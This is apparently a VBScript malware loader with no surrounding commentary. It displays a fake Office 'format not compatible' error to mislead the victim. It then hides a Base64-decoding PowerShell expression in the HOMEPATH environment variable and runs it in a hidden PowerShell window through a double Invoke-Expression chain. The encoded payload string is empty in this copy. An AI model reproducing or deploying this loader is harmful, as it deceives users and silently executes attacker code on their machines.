Set shell = CreateObject("WScript.Shell")
call shell.PoPup ("The format of this document is not compatible with the version of Office that you are running. Check your computer's system information to see if you need an x86 (32-bit) or x64 (64-bit) version.", -1, "Error", 16)
Set EnvVar = shell.Environment("PROCESS")
EnvVar("HOMEPATH") = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''))"
call shell.Run("powershell.exe ""$env:HOMEPATH|iex|iex""",0,0)
